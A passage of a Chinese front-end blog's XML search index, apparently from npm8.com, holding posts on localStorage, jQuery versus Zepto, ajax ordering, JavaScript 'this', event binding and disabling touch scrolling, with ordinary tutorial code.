      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5 本地存储]]></title>
    <url>%2F2016%2F01%2F09%2Fhtml5-%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%2F</url>
    <content type="text"><![CDATA[最近开发项目中，频繁的使用到html5的本地存储，所以对HTML5存储进行了一番研究，为了后期的项目进行知识储备。html5 相对于 html4 新增加了一些有趣的标签、属性和方法，今天主要针对HTMl5的本地存储。在客户端存储数据HTMl5提供了两种在客户端存储数据的新方法：1、localStorage 没有时间限制的数据存储2、sessionStorage 针对 session 的数据存储，一旦窗口关闭就没有了两个方法用法完全一样，下面就以localStorage为例。为什么要用本地存储早期我们都是使用cookie来完成的，但是cookie 不适合大量的数据存储，也就是说它太小，只有 4k 的样子，而且速度慢效率低。使用方法那么我们该如何添加数据呢？很简单，就像给对象添加属性一样：1localStorage.pageLoadCount = 1;可以通过浏览器的控制台来查看是否有存储数据，如图所示：同样读取和修改数据也很方便：123console.log(localStorage.pageLoadCount); //读取localStorage.pageLoadCount = 10; //修改console.log(localStorage.pageLoadCount); //读取以下是结果：当然localStorage本身自带一些方法及属性，具体如下：123456localStorage.clear(); //清除所有的存储数据localStorage.getItem('pageLoadCount'); //读取存储数据，返回值 "10"，等同于 localStorage.pageLoadCountlocalStorage.key(0); //获取存储数据的 key，返回值 "pageLoadCount"localStorage.length; //获取存储数据的长度localStorage.removeItem('pageLoadCount'); //删除特定的存储数据localStorage.setItem('name','Jack'); //新增加一个存储数据，等同于 localStorage.name = 'Jack';需要注意的是：读取存储数据的时候，返回的是字符串，无论之前存的是什么，最后读取的都是字符串，所以读取的时候需要进行类型转换。最后附上localStorage应用的 demo：12345678910111213141516171819&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"/&gt;&lt;title&gt;localStorage&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p id="p"&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt;window.onload = function()&#123;if(!localStorage.pageLoadCount) localStorage.pageLoadCount = 0;localStorage.pageLoadCount=parseInt(localStorage.pageLoadCount) + 1;document.getElementById('p').innerHTML = '浏览次数：' + localStorage.pageLoadCount + ' 次。';&#125;&lt;/script&gt;参考资料HTML 5 Web 存储]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>HTML5 本地存储</tag>
        <tag>localStorage</tag>
        <tag>sessionStorage</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端开发中不使用zepto九大理由]]></title>
    <url>%2F2016%2F01%2F09%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B8%AD%E4%B8%8D%E4%BD%BF%E7%94%A8zepto%E4%B9%9D%E5%A4%A7%E7%90%86%E7%94%B1%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;希望网上公开课的老师们不要再讲移动端网页用zepto了，坑了无数鸟啊 ~~~。1、自己/公司/项目组所写和所积累（网上下的）的js函数都是以jQuery插件的写法来写的，如果要换到zepto上的话那么每个都要改一 点。而且通常都是要同时做PC端和手机端，PC端无疑是要用jQuery，如果手机端用zepto，就会产生两份js插件库，大大增加了维护成本和难度。2、有一部分实用的API被裁剪了，让编程变得困难，本来一句话搞定的事，要自己多写几句才能搞定，一开始还不知道是怎么报的错。3、虽然zepto比jQuery小，但其实文件的大小只在第一次打开该网站时有影响，后面都是使用304本地缓存无需重新下载，文件大小的区别已经没影 响了。就算是第一次下载，移动端不需要IE可以使用jQuery2以上版本，况且现在网站都用GZip压缩，30K左右的大小也能接受吧。4、有一个网站对这几个库进行性能测试，结果是jQuery比zepto的执行效率要高，这就让我怀疑zepto的水平了，明明是裁剪的、为移动优化的但性能却更差。（经过本人亲自测，说明：得出的数值越大说明效率越高性能越好，红色底为效率最低，绿色底为效率最高，我截图只截了最常用的两个写法的效率，苹果和安卓的也测了都是zepto的比jQuery的低，约为60%）Chrome下：Firefox下：5、一个在核心领域核心功能上没有足够优势的库，它作者的水平是否值得信赖，它还会为以后埋下多少坑值得担忧。6、理论上说zepto的tap事件会比click事件少了那300毫秒的延迟，但一般手机端的点击事件基本都要Ajax请求或者跳转页面，相比 网络请求的延迟来说这300毫秒微不足道。而且jQuery也有相应的插件。反正在实际使用中并没有感到那传说中300毫秒的不顺畅。最近了解到说安卓 4.1以上meta标签设置禁止缩放就可以让浏览器禁用300ms的延时了。7、zepto使用touch相关的事件模拟出tap、longTap等事件，目的为解决click事件的300ms 延时，但有个很大的问题是tap事件会“穿透”，“穿透”又会导致一系列问题。业内有个办法是使用一个fastclick的库，用回click事件。&gt;&gt;更多关于fastclick和300ms延时8、如果一些插件需要jQuery而并不适应zepto，但项目主要用zepto，那么就很可能会引入了两个库。很多事件没处理好的话就会触发两次，大大增加了填坑复杂度，而不是花精力去关注真正的业务逻辑。9、网上还有zepto各种小BUG的解决小技巧和方案。但是我认为，一个优秀的框架应该是帮助开发人员减少重复工作的，而不是埋下一堆堆莫名其妙的问题，让开发者纠结了又纠结，找了又找，引入一堆本来并不需 要的库/插件，让管理变得更多复杂。另外，多个分散小文件的下载比一个稍大的文件还要耗时（参考CSS Sprite）。有些东西就是昙花一现，开始看起来很惊艳，但实际用起来到处是坑。zepto，也只是昙花一现而已，或许根本就不是一支昙花而是一朵奇葩。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>jQuery zepto 哪个好</tag>
        <tag>jQuery和zepto区别</tag>
        <tag>jQuery和zepto对比</tag>
        <tag>jq和zepto区别</tag>
        <tag>jq和zepto哪个好</tag>
        <tag>jq和zepto对比</tag>
        <tag>移动端不使用zepto九大原因</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于jQuery实现圆形图片横向轮播酷炫特效]]></title>
    <url>%2F2016%2F01%2F07%2F%E5%9F%BA%E4%BA%8Ejquery%E5%AE%9E%E7%8E%B0%E5%9C%86%E5%BD%A2%E5%9B%BE%E7%89%87%E6%A8%AA%E5%90%91%E8%BD%AE%E6%92%AD%E9%85%B7%E7%82%AB%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;基于jQuery实现圆形图片横向轮播特效是一款个性设计的jQuery+HTML5响应式圆形图片轮播图特效插件mislider。本段代码适应于所有网页使用，有兴趣的朋友们可以前来下载使用。本段代码兼容目前最新的各类主流浏览器，是一款非常优秀的特效插件。效果图：查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>基于jQuery实现圆形图片横向轮播酷炫特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简述jQuery ajax的执行顺序]]></title>
    <url>%2F2016%2F01%2F07%2F%E7%AE%80%E8%BF%B0jquery-ajax%E7%9A%84%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;jquery ajax的执行顺序大家在项目经常会颠倒，下面通过本文给大家介绍jquery ajax的执行顺序，涉及到jquery ajax执行顺序相关知识，对jquery ajax执行顺序相关知识感兴趣的朋友一起学习吧！jQuery中的Ajax的async默认是true(异步请求),如果想一个Ajax执行完后再执行另一个Ajax, 需要把async=false即可。代码如下:1234567891011121314151617181920212223function TestAjax()&#123; var UserName = $("#txtUserName").val(); $.ajax(&#123; url:"AjaxCheckUserName.htm", async:false, success:function(data)&#123; alert(data); &#125; &#125;); alert('Test'); $.ajax(&#123; url:"AjaxHandler.ashx", async:false, data:"UserName=" + UserName, success:function(data)&#123; $("#divAjax").html(data); &#125;, error:function(msg)&#123; alert(msg.responseText); &#125; &#125;);&#125;接着看下jquery $.ajax各个事件执行顺序执行顺序如下：1.ajaxStart(全局事件)2.beforeSend3.ajaxSend(全局事件)4.success5.ajaxSuccess(全局事件)6.error7.ajaxError (全局事件)8.complete9.ajaxComplete(全局事件)10.ajaxStop(全局事件)]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jQ ajax的执行顺序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[终极版讨论javascript中的this，全方面渗透]]></title>
    <url>%2F2016%2F01%2F07%2F%E7%BB%88%E6%9E%81%E7%89%88%E8%AE%A8%E8%AE%BAjavascript%E4%B8%AD%E7%9A%84this%EF%BC%8C%E5%85%A8%E6%96%B9%E9%9D%A2%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在JavaScript中，this 的概念比较复杂。除了在面向对象编程中，this 还是随处可用的。这篇文章介绍了javascript中的this相关知识，对javascript this相关知识感兴趣的朋友一起学习吧!JavaScript 是一种脚本语言，因此被很多人认为是简单易学的。然而情况恰恰相反，JavaScript 支持函数式编程、闭包、基于原型的继承等高级功能。&emsp;&emsp;本文仅采撷其中的一例：JavaScript 中的 this 关键字，深入浅出的分析其在不同情况下的含义，形成这种情况的原因以及 Dojo 等 JavaScript 工具中提供的绑定 this 的方法。可以这样说，正确掌握了 JavaScript 中的 this 关键字，才算迈入了 JavaScript 这门语言的门槛。至于js中this这个东西，好多淫解释过了，看起来好高端的样子，不晓得你看懂了木有？好了，下面加上鄙人比较挫的解释论点：this 不是变量，不是属性，不能为其赋值，它始终指向调用它的对象感觉还TM太虚了，只要记住最重要的一条即可”它始终指向调用它的对象“ ，所以找到调用this的对象，就知道this到底指向谁了1、1alert(this);瞅瞅，弹出来的是么子，要么是”object window“ ,要么 “object” 总之就对象了，是那个对象呢？alert(this === window);结果为’true’ 所以了，现在调用它的对象是window了2、1234var test = function()&#123;alert(this);&#125;test();猜猜上面弹出什么，是不是和”alert(this)” 这句一样的1234var test = function()&#123;alert(this === window);&#125;test();运行上面的代码，是不是弹出了’true’ ?事情就这样完了？要这么简单的话，何必那么多人都去论述这个鸟了？3、再来1234var test = function()&#123;alert(this === window);&#125;new test();哎哎，这次咋成’false’呢？记住”this 始终指向调用它的对象“，第”1、“处调用该段代码的直接对象是全局对象，即”window” ；第”2、“处虽然是函数，但是调用其的仍然是”window“(不要弄混了，函数虽然是对象，但是调用它的是另一个对象)；第”3、“处，使用了”new“ 这时其实已经发生变化了，这是一个构造函数，构造函数创建时创建了一个新的空的对象，即”new test()“创建了一个新的对象，然后再由这个对象指向函数”test”中的代码，因此此时this不在是window对象，而是该构造函数创建的新对象。4、1234567var test =&#123;'a':1,'b':function()&#123;alert(this === test)&#125;&#125;test.b();有了上面的论点，这下一下子清楚了吧！5、12345678var test =&#123;'a':1,'b':function()&#123;alert(this === test)&#125;&#125;var test1 = test;test1.b();so, 你不会认为结果为”false”吧，错了，虽然’test1’的值为’test’ 但是’test1’不还是’test’对象么，它有新产生对象，你暂且理解为引用的了，两个都指向一个对象，奉上下面一段代码为证123456789var test =&#123;'a':1,'b':function()&#123;alert(this === test)&#125;&#125;var test1 = test;test.a = 2;alert(test1.a);如果弹出了”1“，你来骂我6、再整个复杂的123456789var test =&#123;'a':1,'b':&#123;'b1':function()&#123;alert(this === test);&#125;&#125;&#125;test.b.b1();这是”true”还是”false”呢？按照上面的理论，这时”this”不再直接被’test’调用了，而是被’test.b’ 调用, 奉上下面一段代码为证123456789var test =&#123;'a':1,'b':&#123;'b1':function()&#123;alert(this === test.b);&#125;&#125;&#125;test.b.b1();7、好再整个复杂点的1234567var test = function()&#123;var innerTest = function()&#123;alert(this === test);&#125;innerTest();&#125;test();你不会认为弹出”true”吧，不是按照上面的理论’innerTest’是被’test’调用的，然后’this’就指向’test’吗？额，错就错在是谁调用的’innerTest’, 其实这种函数都是’window’对象调用的，及时你嵌套一千层，调用各个函数的都是’window’对象,奉上下面这段代码为证1234567891011var test = function()&#123;var innerTest = function()&#123;alert(this === window);var innerTest1 = function()&#123;alert(this === window);&#125;innerTest1();&#125;innerTest();&#125;test();8、再来一段特殊的123456var test = function()&#123;alert(this === window);&#125;var test1 = &#123;&#125;test.apply(test1);这个我觉得大家都不会猜错，该函数的作用就是”调用一个对象的一个方法，以另一个对象替换当前对象“ 所以了’window’ 对象已经被替代为’test1’，自然为’false’了,奉上如下代码以为证明123456var test = function()&#123;alert(this === test1);&#125;var test1 = &#123;&#125;test.apply(test1);那么诸如’call’之类的也就相似了9、再来一个原型的继承，区别于字面量的继承1234567891011var test = function()&#123;&#125;var my = function()&#123;this.a = function()&#123;alert(this === mytest2);&#125;&#125;var mytest = new my();test.prototype = mytest;var mytest2 = new test();mytest2.a();10、还剩下些什么了，可能就是’dom’对象了1234567&lt;script&gt;var mytest = function(context)&#123;alert(context.getAttribute('id'));alert(this === window);&#125;&lt;/script&gt;&lt;div id="test" onclick="mytest(this)"&gt;aaaa&lt;/div&gt;看了上面的应该了解了吧，里面的’this’分别代表神马]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>javascript中的this</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[回归原生javascript，addEventListener 和 onclick 到底有什么不同？]]></title>
    <url>%2F2016%2F01%2F07%2F%E5%9B%9E%E5%BD%92%E5%8E%9F%E7%94%9Fjavascript%EF%BC%8Caddeventlistener-%E5%92%8C-onclick-%E5%88%B0%E5%BA%95%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[前景&emsp;&emsp;用习惯了JQ，对JQ的事件绑定和处理，相信大家已经是不陌生了，或许大家已经把原js生都抛之脑后了吧，不管是用什么框架，都是离不开原生js，所以建议大家还是对原生的多一些研究比较好！问题描述123var h = document.getElementById("a");h.onclick = dothing1;h.addEventListener("click", dothing2);代码同时保存在一个分离的 .js 文件里面，而且它们都能完美地运行。最佳答案&emsp;&emsp;它们都是正确的，它们之间没有哪个是“最好的”，而且开发者有可能同时使用这两个方法。&emsp;&emsp;事件监听器(Event Listeners，包括 addEventListener 以及 IE 的 attacheEvent)旧版本的 IE 在执行 Javascript 时与几乎所有其它浏览器不同，在 IE 9 之前的版本中，你需要使用attachEvent模块，就像这样：1element.attachEvent('onclick', function() &#123; /* do stuff here*/ &#125;);&emsp;&emsp;在大部分其它浏览器（包括 IE 9 以及更新的版本）中，你可以使用 addEventListener，就像这样：1element.addEventListener('click', function() &#123; /* do stuff here*/ &#125;, false);&emsp;&emsp;使用这些方法（DOM2 事件），理论上你可以向某个元素加入无数的事件。但实际上，这会受限于客户端的内存容量以及其它的性能问题，而这对于每一个浏览器都是不同的。123var myFunctionReference = function()&#123; /* do stuff here */ &#125;element.attachEvent('onclick', myFunctionReference);element.addEventListener('click', myFUnctionReference, false);&emsp;&emsp;addEventListener还有一个特点就是最后的参数，它会控制监听器在事件冒泡阶段时就作出反应。有大约 95% 的可能会像我在例子中那样使用 false。这个参数在 attachEvent 中或在使用内联事件(inline Events) 时没有等效的参数。内联事件 (Inline Events, 即 HTML 中的 onclick=”” 属性 和 element.onclick)在所有支持 Javascript 的浏览器中，你可以将一个事件监听器内联，也就是像下面的 HTML 代码那样：1&lt;a id="testing" href="#" onclick="alert('did stuff inline');"&gt;Click me&lt;/a&gt;&emsp;&emsp;虽然它的确是可以完成任务的，而且简单直接，但绝大部分有经验的开发者都会尽量避开使用这样的方法。同时，你不能在这里使用闭包或者匿名函数（虽然处理程序本身就是一个匿名函数），而且你的控制范围是有限的。另一个方法是这样的（也就是你提到的）：1element.onclick = funtion () &#123; /* do stuff here */ &#125;&emsp;&emsp;实际上这等价于内联 Javascript （也就是上面那种在 HTML 标签属性中添加的方法），不过这样可以拥有更大的控制范围，同时可以使用匿名函数、函数表达式或闭包。&emsp;&emsp;内联事件有个重大的缺点就是，不像上面提到的事件监斩器那样，你只可以指定一个内联事件。内联事件会转化元元素的属性，那意味着当指定多个的内联事件时，它之前所指定的内联事件会被覆盖掉。使用上面 HTML 代码中的1234```javascriptvar element = document.getElementById(&apos;testing&apos;);element.onclick = function () &#123; alert(&apos;did stuff #1&apos;); &#125;;element.onclick = function () &#123; alert(&apos;did stuff #2&apos;); &#125;;&emsp;&emsp;当你点击这个元素后，你只可以看到 “Did stuff #2”，原因是第二个值覆盖了第一个指定的 onclick 属性，同时，会把 HTML 中 onclick 属性也覆盖掉。&nbsp;二者谁更好呢？&emsp;&emsp;主要的问题是浏览器兼容性和必要性。你目前是否需要添加一个以上的事件到一个元素上？未来是否需要？大部分时候，你是需要的。所以，使用attachEvent和addEventListener 是非常有必要的，不然用内联事件就好了。&emsp;&emsp;JQuery 以及很多其它的 Javascript 框架都为不同的浏览器封装了通用的处理 DOM2 事件的通用模型(Models)，这样你可以在做跨浏览器兼容时不需要为 IE 的历史遗留问题而烦恼了。同样的代码在 jQuery 中做跨浏览器兼容，只需要这样：1$(element).on('click', function () &#123; /* do stuff */ &#125;);&emsp;&emsp;当然了，不要因为这么一件事而使用一个框架。你可以很容易地写出一个小工具来兼容旧版本的浏览器：12345678910111213function addEvent(element, evnt, funct)&#123; if (element.attachEvent) return element.attachEvent('on' + evnt, funct); else return elemt.addEventListener(evnt, funct, false);&#125;//exampleaddEvent( document.getElementById('myElement'), 'click', function () &#123; aler('hi!'); &#125;);&emsp;&emsp;综上，除非你看的这段脚本用其他方法处理了不同浏览器之间的差异 ，使用addEventListener的部分不会在 IE 9 以下的 IE 工作。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ddEventListener 和 onclick 有什么不同</tag>
        <tag>ddEventListener 和 onclick 的区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5仿手机微信摇一摇]]></title>
    <url>%2F2016%2F01%2F07%2Fhtml5%E4%BB%BF%E6%89%8B%E6%9C%BA%E5%BE%AE%E4%BF%A1%E6%91%87%E4%B8%80%E6%91%87%2F</url>
    <content type="text"><![CDATA[还记得你无聊时候想通过微信摇一摇功能，摇出个未来吗？没错，就是这个功能，今天共享给大家html5开发的手机微信摇一摇功能，在网页中模仿html5微信摇一摇功能，在手机里效果更流畅，配上那摇一摇熟悉的声音，更加形象生动而逼真，好了，不耍逼格了，直接上演示和代码：演示效果图手机扫一扫，体验一下吧！查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>html5仿手机微信摇一摇</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[兼容各浏览器的设为首页和加入收藏代码]]></title>
    <url>%2F2016%2F01%2F07%2F%E5%85%BC%E5%AE%B9%E5%90%84%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E8%AE%BE%E4%B8%BA%E9%A6%96%E9%A1%B5%E5%92%8C%E5%8A%A0%E5%85%A5%E6%94%B6%E8%97%8F%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[兼容各浏览器的设为首页和加入收藏代码:加入收藏和设为首页代码几乎各个网站都在头部放上一个，有没有效果先不管，需求应该是有的。但是由于浏览器的兼容性问题，之前用的很多代码都失去效果，下面就给出一段能够兼容各个浏览器的代码，也不能够算是兼容，只能说在不支持的浏览器中能够给出提示，代码如下:12345678910111213141516171819202122232425262728293031323334353637&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;加入收藏和设为首页&lt;/title&gt;&lt;script type="text/javascript"&gt;//加入收藏function AddFavorite(sURL, sTitle)&#123;sURL = encodeURI(sURL);try&#123;window.external.addFavorite(sURL, sTitle);&#125;catch(e)&#123;try&#123;window.sidebar.addPanel(sTitle, sURL, "");&#125;catch(e)&#123;alert("加入收藏失败，请使用Ctrl+D进行添加,或手动在浏览器里进行设置.");&#125;&#125;&#125;//设为首页function SetHome(url)&#123;if (document.all)&#123;document.body.style.behavior='url(#default#homepage)';document.body.setHomePage(url);&#125;else&#123;alert("您好,您的浏览器不支持自动设置页面为首页功能,请您手动在浏览器里设置该页面为首页!");&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="javascript:void(0)"&gt;设为首页&lt;/a&gt;&lt;a href="javascript:void(0)"&gt;加入收藏&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;上面的代码算是一个能够兼容各个浏览器的加入收藏和设为首页代码。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>兼容各浏览器的设为首页和加入收藏代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQ+CSS+DIV多彩随机变化链接样式tag标签样式]]></title>
    <url>%2F2016%2F01%2F05%2Fjqcssdiv%E5%A4%9A%E5%BD%A9%E9%9A%8F%E6%9C%BA%E5%8F%98%E5%8C%96%E9%93%BE%E6%8E%A5%E6%A0%B7%E5%BC%8Ftag%E6%A0%87%E7%AD%BE%E6%A0%B7%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[tag标签随机多彩变化的超链接样式，使用JQ+DIV+CSS实现刷新随机变化样式特效。jquery版的随机多彩tag标签随机css字体颜色和字号大小效果。于是就写下这个效果与大家分享，办法也很笨拙，就是利用jquery随机数来遍历#tag中所有的a链接为其添加一个随机的类名。然后预先定义了12个链接样式。你可以自定义类似 #tags .tags1 这样的css以实现你需要的字体样式。这里的jquery随机多彩tag标签随机颜色和字号大小效果样式只是演示随便写的，不够漂亮。js代码如下：123456789101112&lt;script src="jquery.min.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script type=javascript"&gt;$(document).ready(function() &#123;var tags_a = $("#tags a");tags_a.each(function()&#123;var x = 9;var y = 0;var rand = parseInt(Math.random() * (x - y + 1) + y);$(this).addClass("tags"+rand);&#125;);&#125;)&lt;/script&gt;css代码如下：1234567891011121314151617181920212223body&#123; text-align:center&#125;body,a&#123; font-size:13px;&#125;a&#123; color:#333333; text-decoration:none;&#125;.taglist&#123; width:350px;overflow:hidden; text-align:left; margin:0 auto;border:#dddddd solid 1px;&#125;.taglist .tit&#123; width:100%; height:24px; line-height:24px; background-color:#565662;&#125;.taglist .tit a&#123; padding-left:8px; color:#ffffff;&#125;#tags a&#123;height:26px; line-height:26px;padding-right:6px;&#125;#tags .tags0&#123;&#125;#tags .tags1&#123;color:#C00; font-size:24px;&#125;#tags .tags2&#123;color:#030; font-size:16px;&#125;#tags .tags3&#123;color:#00F;&#125;#tags .tags4&#123; font-size:16px;&#125;#tags .tags5&#123;color:#C00; font-size:20px;&#125;#tags .tags6&#123;color:#F06 font-size:20px;&#125;#tags .tags7&#123;color:#030; font-weight:bold; font-size:18px;&#125;#tags .tags8&#123;color:#F06; font-weight:bold;&#125;#tags .tags9&#123;color:#C00; font-weight:bold;font-size:16px;&#125;#tags .tags10&#123;color:#090; font-weight:bold;font-size:18px;&#125;#tags .tags11&#123;color:#09F;&#125;#tags .tags12&#123;color:#F90;font-size:14px;&#125;#tags a:hover&#123; color:#F00; text-decoration:underline;&#125;.w95&#123; width:95%; margin:0 auto; padding-top:6px; padding-bottom:6px;&#125;.taglist .w95&#123;&#125;HTML代码部分：123456789101112131415161718192021222324&lt;div class="taglist"&gt; &lt;div class="tit"&gt;&lt;a href="#"&gt;TAG标签&lt;/a&gt;&lt;/div&gt; &lt;div class="w95" id="tags"&gt; &lt;a href="http://www.npm8.com"&gt;导航菜单&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;焦点幻灯片&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;条幅广告代码&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;经典下拉菜单&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;jquery 特效&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;滚动代码&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;查看源码&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;css hack&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;file样式美化&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;CSS&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;HTML&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;DIVCSS5&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;JS+CSS幻灯片&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;网页源码&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;多彩导航条&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;css div&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;JS表格隔行变色&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;css+div&lt;/a&gt; &lt;a href="http://www.npm8.com"&gt;下拉菜单&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;本特效可用于tag标签随机多彩变化的超链接样式。使用非常简单，可以预设多个想要的CSS a样式，可以设置超链接文字大小、字体颜色、字体背景等不同样式，随机刷新网页时候JQ自动实现超链接文字多样css样式特效效果。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>多彩随机变化链接样式tag标签样式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery中通过全局变量来禁止多次ajax请求]]></title>
    <url>%2F2015%2F12%2F28%2Fjquery%E4%B8%AD%E9%80%9A%E8%BF%87%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E6%9D%A5%E7%A6%81%E6%AD%A2%E5%A4%9A%E6%AC%A1ajax%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前端开发中，很多都需要考虑用户体验，就在本文即将介绍的ajax就需要值得考虑：用户不太懂网站，点了按钮后，如果网速慢了会反应特别慢，就怕用户连续点击按钮造成客户端向服务器发送了一次又一次的ajax请求，浪费了服务器的资源。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在百度上搜索了半天，开始的时候是搜索jquery中ajax的当前状态如何获取，想通过每次ajax请求之前来判断当前ajax的状态来控制再次的ajax请求，在网上看了好多的教程，自己也测试了好多，都没啥用！这里不得不再报怨一句，搜索引擎里搜索出来的文章可真是天下一大抄啊！不说废话了，来看测试后总结出来的代码：123456789101112131415161718192021222324252627&lt;script language="javascript"&gt;var ajaxstate=false;//定义全局变量，通过这个变量来获得当前的ajax状态$(function()&#123; $(document).ajaxStart(function()&#123; $("#Con").html("数据加载中"); &#125;).ajaxStop(function(evt,request,settings)&#123;//jquery里的全局事件，当ajax请求结束后，改变全局变量的值 ajaxstate=false; &#125;); &#125;);$.ajaxSetup(&#123; global:true, type: "POST", cache:false, async:true, beforeSend:function(e,xhr)&#123; if(ajaxstate)&#123; alert("上次请求尚未完成,不能请求"+xhr.url); return false; &#125; ajaxstate=true; &#125;, error:function(a,b,c)&#123; alert(b+":"+c+"\n\n"+"请重新登录：www.npm8.com"); $("#R").html(b+":"+c+a+" "+"请重新登录：www.npm8.com"); &#125;&#125;);&lt;/script&gt;大家可以根据上面提供的代码，自己改编一下在本地进行测试，当连续俩次ajax请求时，第二次请求就会弹出提示框的！]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ajax禁止多次请求</tag>
        <tag>jquery中禁止多次ajax请求</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端禁止触屏滑动touchmove方法介绍]]></title>
    <url>%2F2015%2F12%2F28%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%A6%81%E6%AD%A2%E8%A7%A6%E5%B1%8F%E6%BB%91%E5%8A%A8touchmove%E6%96%B9%E6%B3%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在移动端页面开发中，有时需要禁止用户滑动屏幕，搜索了好久才找到移动终端的touch事件，touchstar,touchmove,touchend.阻止滚动&emsp;&emsp;一些移动设备有缺省的touchmove行为，比如说经典的iOS overscroll效果，当滚动超出了内容的界限时就引发视图反弹。这种做法在许多多点触控应用中会带来混乱，但要禁用它很容易。123document.body.addEventListener('touchmove', function(event) &#123; event.preventDefault(); &#125;, false);&emsp;&emsp;在PC端页面开发中，可以设置onmousewheel，其实在大多数浏览器（IE6, IE7, IE8, Opera 10+, Safari 5+）中，都提供了 “mousewheel” 事件。但杯具的是 Firefox 3.5+ 却不支持此事件，不过庆幸 Firefox 3.5+ 中提供了另外一个等同的事件：”DOMMouseScroll” （事件和事件属性的测试案例）。1234567891011121314151617181920212223242526272829303132333435363738var addEvent = (function()&#123;if (window.addEventListener) &#123;return function(el, sType, fn, capture) &#123;el.addEventListener(sType, fn, (capture));&#125;;&#125; else if (window.attachEvent) &#123;return function(el, sType, fn, capture) &#123;el.attachEvent("on" + sType, fn);&#125;;&#125; else &#123;return function()&#123;&#125;;&#125;&#125;)(),stopEvent: function(event) &#123;if (event.stopPropagation) &#123;event.stopPropagation();&#125; else &#123;event.cancelBubble = true;&#125;if (event.preventDefault) &#123;event.preventDefault();&#125; else &#123;event.returnValue = false;&#125;&#125;,zoomIn = function()&#123;&#125;,zoomOut = function()&#123;&#125;,// isFirefox 是伪代码，大家可以自行实现mousewheel = isFirefox ? "DOMMouseScroll" : "mousewheel";// object 是伪代码，你需要注册 Mousewheel 事件的元素addEvent(object, mousewheel, function(event)&#123;var delta = 0;event = window.event || event;stopEvent(event);delta = event.wheelDelta ? (event.wheelDelta / 120) : (- event.detail / 3);// zoomIn, zoomOut 是伪代码，需要实现的缩放事件delta &gt; 0 ? zoomIn(delta): zoomOut(Math.abs(delta));&#125; , false);]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端禁止滑动</tag>
        <tag>移动端禁止触屏滑动touchmove</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨浏览器平台获取鼠标位置]]></title>
